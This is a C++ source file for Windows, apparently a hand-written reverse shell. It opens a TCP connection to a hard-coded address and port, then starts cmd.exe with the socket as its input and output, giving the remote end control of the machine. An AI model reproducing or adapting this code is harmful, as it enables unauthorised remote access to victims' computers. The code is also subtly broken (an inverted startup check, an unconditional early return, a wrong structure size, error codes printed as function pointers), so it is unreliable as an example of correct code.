#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <iostream>
#include <WS2tcpip.h>
#include <windows.h>
#include <memory>

using namespace std;

#pragma comment(lib, "Ws2_32.lib")

STARTUPINFO si;
PROCESS_INFORMATION pi;
WSADATA wsaData;
struct sockaddr_in FuckyWucky;

int main(void) {
	const char* TheHosT = "10.0.2.15";
	short ThePorT = 4444;

	WORD wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	if (!WSAStartup(wVersionRequested, &wsaData))
		cout << "[-] Failed to initiate the winsock\nError Code : " << WSAGetLastError << endl;
	return WSAGetLastError();
	cout << "[+] winsock initialised\n";
	SOCKET sockpenis;
	if (sockpenis = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) {
		cout << "[+] Socket Created" << endl;
		FuckyWucky.sin_addr.s_addr = inet_addr(TheHosT);
		FuckyWucky.sin_family = AF_INET;
		FuckyWucky.sin_port = htons(ThePorT);
	}
	else {
		cout << "[-] Failed to create a socket.\nError code : " << WSAGetLastError << endl;
		return WSAGetLastError();
	}
	if (connect(sockpenis, (struct sockaddr*)&FuckyWucky, sizeof(FuckyWucky)) < 0) {
		cout << "[-] Failed to connect to sockpenis\n";
		return WSAGetLastError();
	}
	else {
		cout << "[+] Connected to sockpenis\n";
	}
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(FuckyWucky);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE) sockpenis;
	CreateProcessA(NULL,(LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA) & si, &pi);
	return 0;
}